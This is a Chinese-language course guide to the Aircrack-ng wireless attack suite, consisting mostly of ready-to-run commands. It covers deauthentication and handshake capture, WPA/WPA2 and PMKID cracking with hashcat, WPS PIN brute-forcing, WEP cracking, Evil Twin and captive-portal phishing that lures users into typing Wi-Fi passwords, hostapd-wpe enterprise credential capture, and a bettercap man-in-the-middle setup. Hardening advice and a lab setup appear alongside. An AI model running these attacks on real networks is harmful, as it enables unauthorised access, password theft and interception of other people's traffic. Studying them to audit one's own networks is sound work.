# Aircrack-ng 无线网络安全测试套件完全指南

> 分类：工具指南 | 难度：进阶 | 阅读时间：约45分钟

## 概述

Aircrack-ng 是全球最著名的无线网络安全测试工具套件，专门用于 802.11 无线网络的评估、监控、攻击和破解。它由 Thomas d'Otreppe 领导的开源社区维护，包含一整套工具，覆盖了从无线网卡模式切换、数据包捕获、WPA/WPA2 握手抓取，到密钥破解的完整流程。

**核心工具链**：
| 工具 | 功能 |
|:---|:---|
| aircrack-ng | 核心破解引擎（WEP/WPA/WPA2-PSK）|
| airmon-ng | 网卡模式管理（启用/停止监听模式）|
| airodump-ng | 数据包捕获与网络扫描 |
| aireplay-ng | 数据包注入与攻击（Deauth等）|
| airdecap-ng | 解密已捕获的 WEP/WPA 数据包 |
| airtun-ng | 虚拟隧道接口创建 |
| airbase-ng | 伪造 AP（接入点）|
| airdecloak-ng | 去除 WEP 伪装 |
| packetforge-ng | 构造注入包 |
| wpaclean | 清理 WPA 捕获文件 |
| aircrack-ng | 核心破解引擎 |

## 核心知识点

- 无线网卡的兼容性与监听模式
- WPA/WPA2-PSK 破解流程（4-way handshake）
- WPA3 与 PMKID 攻击
- 认证解除攻击（Deauthentication Attack）
- 伪造 AP（Evil Twin）攻击
- 字典攻击与 GPU 加速破解（hashcat 配合）
- 无线安全加固建议

---

## 一、安装

```bash
# Kali Linux（预装）
# 无需额外安装

# Ubuntu/Debian
sudo apt install aircrack-ng -y

# macOS
brew install aircrack-ng

# 从源码编译
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install

# 验证
aircrack-ng --help
aireplay-ng --help
```

---

## 二、无线网卡配置

### 2.1 网卡兼容性

推荐网卡芯片：
- **Atheros AR9271**：ALFA AWUS036NHA
- **Ralink RT3070**：ALFA AWUS036NH
- **Realtek RTL8812AU**：双频 AC 网卡
- **Mediatek MT7612U**：ALFA AWUS036ACM（双频）

```bash
# 检查网卡
iwconfig
# 确认支持 Monitor Mode + Packet Injection

# 检查芯片组
lsusb
airmon-ng
```

### 2.2 启用监听模式

```bash
# 方法1：airmon-ng（推荐）
sudo airmon-ng check kill    # 杀死可能冲突的进程
sudo airmon-ng start wlan0   # 启动监听模式
# 接口通常变为 wlan0mon

# 方法2：手动
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 验证
iwconfig wlan0mon
# Mode:Monitor 即为成功

# 检查包注入能力
sudo aireplay-ng --test wlan0mon
# 期望输出：Injection is working!
```

---

## 三、WPA/WPA2-PSK 破解完整流程

### 3.1 步骤1：扫描目标网络

```bash
# 扫描附近 WiFi
sudo airodump-ng wlan0mon

# 或指定信道和频段
sudo airodump-ng wlan0mon --band abg

# 输出解读：
# BSSID：AP的MAC地址
# CH：信道
# ENC：加密方式（WPA2/CCMP）
# ESSID：WiFi名称
# STATION：已连接的客户端MAC
```

### 3.2 步骤2：定向捕获握手包

```bash
# 针对特定AP捕获（保存抓包数据）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6: 指定信道
# -w capture: 输出文件前缀（生成 capture-01.cap）
# 等待顶部出现 WPA handshake: AA:BB:CC:DD:EE:FF

# 如果等待时间过长，使用 Deauth 攻击强制客户端重连
# 新开一个终端：
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# --deauth 10: 发送10个解除认证包
# -a: AP MAC地址
# -c: 客户端MAC（可选，不指定则广播）
```

### 3.3 步骤3：破解 WPA/WPA2 握手包

```bash
# 字典攻击
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 或使用 hashcat（快得多！）
# 首先转换格式
hcxpcapngtool capture-01.cap -o hash.hc22000

# hashcat 破解（GPU）
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d   # 8位数字掩码
```

---

## 四、PMKID 攻击（无需客户端）

2018年 Jens Steube 发现的攻击方法，**不需要等待客户端连接和握手**，直接从 AP 获取 PMKID：

```bash
# 安装 hcxdumptool
sudo apt install hcxdumptool -y

# 抓取 PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3

# 转换为 hashcat 格式
hcxpcapngtool pmkid.pcapng -o pmkid_hash.hc22000

# 破解
hashcat -m 22000 pmkid_hash.hc22000 wordlist.txt
```

---

## 五、伪造 AP（Evil Twin）攻击

### 5.1 创建伪造 AP

```bash
# 创建同名伪造AP
sudo airbase-ng -e "TargetWiFi" -c 6 wlan0mon
# 创建 at0 虚拟接口

# 配置网络
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0

# 启动 DHCP 服务
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0

# 配合 iptables 做 NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
# echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 5.2 Captive Portal 钓鱼

```
工具配合：
- WiFi-Pumpkin：图形化 Evil Twin 框架
- Fluxion：自动化的 Evil Twin + Captive Portal
- Wifiphisher：Wi-Fi 钓鱼框架
```

```bash
# Wifiphisher 示例
sudo wifiphisher -e "Starbucks WiFi" -p firmware-upgrade
# 显示伪造的固件升级页面，诱导用户输入 WiFi 密码
```

---

## 六、WPS PIN 攻击

```bash
# WPS PIN 暴力破解（8位数字中的漏洞：实际只需尝试11000次）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust 攻击（针对特定芯片组的路由器）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# 多次尝试应间隔时间（避免锁定）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --delay=10 --session=mysession
```

---

## 七、WEP 破解（仅限旧设备研究）

WEP 已不推荐使用，但了解其破解方法有助于理解无线安全演进：

```bash
# 收集IVs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_cap wlan0mon
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon  # 加速IV收集

# 破解（约需40,000个IVs）
aircrack-ng wep_cap-01.cap
```

---

## 八、安全加固建议

| 建议 | 说明 |
|:---|:---|
| 使用 WPA3 或 WPA2-Enterprise | 替代 WPA2-PSK，抵抗 PMKID 和字典攻击 |
| 设置复杂 WiFi 密码 | 20+ 字符、混合大小写+数字+特殊字符 |
| 禁用 WPS | 完全禁用 WPS PIN 功能 |
| 定期更换密码 | 降低字典攻击的有效窗口期 |
| 隐藏 SSID（有限效果） | 仍可通过抓包发现 |
| MAC 地址过滤（有限效果） | 可被 MAC 欺骗绕过 |
| 802.1X 认证 | 企业级 RADIUS 认证 |
| 定期安全审计 | 使用工具测试自己的 WiFi 安全性 |

---

## 九、速查卡

```
监听模式:       sudo airmon-ng start wlan0
扫描网络:       sudo airodump-ng wlan0mon
定向抓包:       sudo airodump-ng -c 6 --bssid MAC -w capture wlan0mon
Deauth攻击:     sudo aireplay-ng --deauth 10 -a AP_MAC wlan0mon
WPA破解:        aircrack-ng -w wordlist.txt capture-01.cap
转换hashcat:    hcxpcapngtool capture.pcapng -o hash.hc22000
hashcat破解:    hashcat -m 22000 hash.hc22000 wordlist.txt
PMKID攻击:      无需客户端在线
Evil Twin:      sudo airbase-ng -e "SSID" -c CH wlan0mon
WPS破解:        sudo reaver -i wlan0mon -b AP_MAC -vv
测试注入:       sudo aireplay-ng --test wlan0mon

推荐网卡:       ALFA AWUS036NHA (Atheros AR9271)
                ALFA AWUS036ACM (Mediatek MT7612U, 双频)
```

---

## 实战场景扩展

### 场景五：Evil Twin 攻击

```bash
# 1. 扫描目标网络
sudo airodump-ng wlan0mon

# 2. 创建伪造 AP
sudo airbase-ng -e "CorporateWiFi" -c 6 -P wlan0mon

# 3. 配置 DHCP（为连接客户端分配 IP）
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
sudo dnsmasq -C /dev/null -kd -F 10.0.0.50,10.0.0.150 -i at0 --bind-dynamic

# 4. 启动伪造的登录页面（用 Apache/Node.js）
# 创建 fake_portal 服务器，收集凭据

# 5. 认证解除（迫使客户端断开合法AP）
sudo aireplay-ng -0 10 -a LEGIT_AP_MAC wlan0mon
# -0 10: 发送10个 deauth 包
# -a: 目标 AP 的 BSSID
```

### 场景六：WPA3 与 PMKID 攻击

```bash
# WPA3 过渡模式（SAE 回退）
# 当 AP 同时支持 WPA2 和 WPA3 时，可能泄漏 PMKID

# 1. 抓取 PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# 2. 转换为 hashcat 格式
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# 3. 破解
hashcat -m 22000 pmkid.22000 wordlist.txt
```

### 场景七：WPS PIN 攻击

```bash
# WPS Pixie Dust Attack（针对特定芯片漏洞）
# 离线攻击，不需要频繁尝试 PIN

sudo pixiewps -e AP_BSSID \
  -s E-S1 \
  -z E-S2 \
  -a AuthKey \
  -n E-Hash1 \
  -r E-Hash2

# 在线 WPS PIN 暴力破解（Reaver）
sudo reaver -i wlan0mon -b AP_MAC -vv -K 1
# -K 1: pixiewps 模式
# -vv: 详细输出
```

### 场景八：WEP 攻击（旧/测试网络）

```bash
# 1. 抓包
sudo airodump-ng --bssid AP_MAC -c CHANNEL -w wep_capture wlan0mon

# 2. 注入 ARP 请求以增加 IVs
sudo aireplay-ng -3 -b AP_MAC -h CLIENT_MAC wlan0mon

# 3. 当 IVs > 5000 后破解
sudo aircrack-ng wep_capture-01.cap

# 无客户端场景（Fake Auth）
sudo aireplay-ng -1 0 -e "SSID" -a AP_MAC wlan0mon
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AP_MAC wlan0mon
sudo aireplay-ng -3 -b AP_MAC wlan0mon
```

### 场景九：客户端的 ARP 攻击

```bash
# ARP 请求重放（获取更多 WPA 握手）
sudo aireplay-ng -3 -b AP_MAC -h CLIENT_MAC wlan0mon

# 客户端探测请求分析
sudo airodump-ng wlan0mon --output-format csv -w probe_dump
cat probe_dump-01.csv | grep "Probe" | awk -F, '{print $NF}' | sort -u
# 发现设备历史连接的 SSID 列表

# KARMA 攻击：回应所有 Probe Request
sudo airbase-ng -P -C 30 -v wlan0mon
# -P: 回应所有探测请求
# -C 30: 信标间隔30ms
```

### 场景十：无线安全审计报告

```bash
# 生成完整报告脚本
#!/bin/bash
AIRMON=wlan0mon
REPORT_DIR="audit_$(date +%Y%m%d)"

mkdir -p $REPORT_DIR

# 1. 扫描周边网络（5分钟）
sudo timeout 300 airodump-ng $AIRMON -w $REPORT_DIR/scan --output-format csv

# 2. 分析加密方式
echo "=== Encryption Analysis ===" > $REPORT_DIR/report.txt
grep -E "WPA2|WPA3|WEP|OPN" $REPORT_DIR/scan-01.csv | \
  awk -F, '{print $14, $1, $4}' >> $REPORT_DIR/report.txt

# 3. 检查弱信号 AP（近处不应信号弱）
echo "=== Weak Signals ===" >> $REPORT_DIR/report.txt
awk -F, '$3 < -70 {print $14, $1, $3" dBm"}' $REPORT_DIR/scan-01.csv

echo "Report: $REPORT_DIR/report.txt"
```

---

## 防御建议

1. **使用 WPA3-SAE**（替代 WPA2-PSK）
2. **禁用 WPS**（路由器管理界面关闭）
3. **使用长且复杂的密码**（20+ 字符随机）
4. **企业环境使用 WPA2-Enterprise（802.1X）**
5. **定期扫描周边 Wi-Fi**，发现 Rogue AP
6. **部署 WIPS（无线入侵防御）**

---

---

## 完整 WPA2-PSK 破解流程复习

```
[准备工作]
1. 确认网卡兼容：iwconfig → 支持 Monitor Mode
2. 启动监听模式：airmon-ng start wlan0 → wlan0mon
3. 测试注入能力：aireplay-ng --test wlan0mon

[扫描阶段]
4. 扫描周边网络：airodump-ng wlan0mon
   - BSSID: AP 的 MAC 地址
   - CH: 信道
   - ENC: WPA2 CCMP
   - AUTH: PSK
   - ESSID: 网络名

[捕获握手包]
5. 锁定目标：
   airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon
6. 认证解除（另一个终端）：
   aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon
7. 看到 "WPA handshake:" 即成功

[离线破解]
8. aircrack-ng capture-01.cap -w rockyou.txt
   或
   hashcat -m 22000 capture.hc22000 wordlist.txt
```

## 高级攻击技术

### WPA2 Enterprise (802.1X) 攻击

```bash
# 搭建 Evil Twin + FreeRADIUS - 证书凭据窃取
# 1. 使用 hostapd-wpe（Wireless Pwnage Edition）
hostapd-wpe hostapd-wpe.conf

# 配置 hostapd-wpe.conf：
interface=wlan0mon
ssid=CorporateWiFi
channel=6
wpa=2
auth_algs=1
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
eap_user_file=hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key

# 捕获的凭据保存在 hostapd-wpe.log
# 包含 challenge/response → 可用于 offline cracking
asleap -C CHALLENGE -R RESPONSE -W wordlist.txt
```

### KRACK 攻击

```
# WPA2 四次握手重装密钥攻击（已修复但仍值得学习）
# 影响范围：WPA2 所有设备（2017年发现）
# CVE: CVE-2017-13077 ~ CVE-2017-13088

# 工具：https://github.com/vanhoefm/krackattacks-scripts
# 强迫客户端重新安装已使用的密钥 → 重置 nonce/重放计数器
```

### WiFi 中间人攻击

```bash
# Bettercap 替代方案（比 aircrack-ng 更易用的 MITM 攻击）
bettercap --eval "set wifi.interface wlan0mon; wifi.recon on; sleep 30;
  set wifi.ap.ssid FreeWiFi; set wifi.ap.bssid DE:AD:BE:EF:CA:FE;
  wifi.ap on"

# 结合 HTTP/HTTPS 代理
# 将所有通过伪造AP的流量重定向到攻击机
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## 字典策略

```bash
# 专用 WiFi 密码字典
# 路由器默认密码模式
# 1. 纯数字8位
crunch 8 8 0123456789 -o wifi_numbers_8.txt

# 2. 字母+数字8位
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wifi_8_mixed.txt

# 3. 常见路由器密码模式
# TP-LINK: 纯数字8位
# D-Link: admin + 密码
# NETGEAR: pattern word + 数字

# 4. 使用 hashcat 掩码（比 aircrack-ng 快得多）
hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
hashcat -m 22000 capture.hc22000 -a 3 ?l?l?l?l?d?d?d?d
```

## WiFi 安全审计检查清单

| 检查项 | 命令/方法 | 风险 |
|:---|:---|:---|
| WPA2-PSK 弱密码 | aircrack-ng + rockyou | 高 |
| WPS 开启 | `wash -i wlan0mon` | 高 |
| 未使用 WPA3 | 扫描结果显示 WPA2 only | 中 |
| 默认 SSID | 扫描结果已知厂商 | 低 |
| Rogue AP | 相同 SSID 不同 BSSID | 高危 |
| 未使用 802.1X (企业) | WPA-PSK 而非 Enterprise | 中 |
| 开放网络 | `ENC: OPN` | 严重 |
| 客户端 Probe 泄露 | airodump-ng 看到 Probe | 中 |

## 环境搭建与练习

```bash
# 自建练习环境
# 方法1: 使用旧路由器
# 1. 找一个支持 WPA2 的旧路由器
# 2. 设置弱密码（如 password123）
# 3. 用 aircrack-ng 练习完整破解流程

# 方法2: Docker 虚拟 AP
docker pull c0mix/hostapd-docker
docker run --privileged --net=host c0mix/hostapd-docker

# 方法3: 使用 hostapd 自建热点
sudo apt install hostapd dnsmasq
# 配置 hostapd.conf：
interface=wlan0
ssid=TestWiFi
channel=6
wpa=2
wpa_passphrase=weakpassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
```

## 设备选购指南

| 设备 | 芯片组 | 双频 | 注入 | 价格 |
|:---|:---|:---:|:---:|:---:|
| ALFA AWUS036NHA | Atheros AR9271 | 2.4G | ✅ | ~$40 |
| ALFA AWUS036ACH | Realtek RTL8812AU | 双频 | ✅ | ~$55 |
| ALFA AWUS036ACM | Mediatek MT7612U | 双频 | ✅ | ~$50 |
| Panda PAU09 | Ralink RT5572 | 双频 | ✅ | ~$35 |
| TP-Link TL-WN722N v1 | Atheros AR9271 | 2.4G | ✅ | ~$20 |
| TP-Link TL-WN722N v2/v3 | Realtek RTL8188 | 2.4G | ❌ | - |

> ⚠️ TP-Link TL-WN722N v1 已停产，v2/v3 不支持注入和监听模式。

## 6 GHz / WiFi 6E 支持

```
当前 aircrack-ng 对 WiFi 6E (6 GHz) 支持有限。
推荐设备：
- Intel AX210 (M.2, 需转接卡)
- ALFA AWUS036AXML (Mediatek MT7921)

注意：
- 6 GHz 需要 WPA3 (不支持 WPA2)
- Linux 需要 kernel 5.11+
- 需要 iw 命令配置频段
```

---

---

## 安装前检查清单

```bash
# 1. 确认网卡支持
iwconfig 2>/dev/null | grep -E "IEEE|Mode"
# 应有 wlan0 或 wlan1

# 2. 检查芯片组
lsusb | grep -i "atheros\|ralink\|realtek\|mediatek"
# 或
lspci | grep -i "network"

# 3. 验证监听模式
sudo airmon-ng check
sudo airmon-ng start wlan0
iwconfig wlan0mon | grep "Mode:Monitor"

# 4. 测试注入
sudo aireplay-ng --test wlan0mon
# 期望输出: "Injection is working!"

# 5. 关闭干扰进程
sudo airmon-ng check kill
# 关闭: NetworkManager, wpa_supplicant, dhclient 等

# 完成后恢复
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

## 故障排查速查

| 问题 | 诊断 | 解决方案 |
|:---|:---|:---|
| 网卡无 Monitor Mode | `iw list \| grep monitor` | 更换兼容网卡 |
| 注入失败 | `aireplay-ng --test` 失败 | 检查网卡驱动/芯片组 |
| 抓不到握手包 | 客户端不在或距离远 | 靠近AP，做主动 Deauth |
| 握手包损坏 | aircrack-ng 报 invalid | 使用 `wpaclean` 清理 |
| 破解缓慢 | 纯 CPU 模式 | 转为 hashcat + GPU |
| 信道跳转 | airodump-ng 频繁跳 | `-c CHANNEL` 锁定信道 |
| 无客户端可见 | AP 无活动用户 | 等待或模拟客户端 |
| 多次 deauth 无握手 | 客户端重连太快 | 减少 deauth 数量，增加等待 |

## 练习挑战

### 挑战1：基础 WPA2 破解
```
条件：使用弱密码 "password123" 的测试 AP
目标：完整流程获取密码
步骤：
1. 扫描网络
2. 锁定目标信道
3. 抓取握手包
4. 离线破解
```

### 挑战2：隐藏 SSID 发现
```
条件：AP 不广播 SSID
目标：通过抓取 Probe Request/Response 获取 SSID
提示：airodump-ng 会在客户端连接时显示 SSID
```

### 挑战3：MAC 过滤绕过
```
条件：AP 启用 MAC 地址过滤
目标：欺骗合法客户端的 MAC 地址连接网络
提示：macchanger 修改 MAC 地址
```

---

> 📖 本文为"网安百宝箱"课程配套读物。更新于 2026-06-18
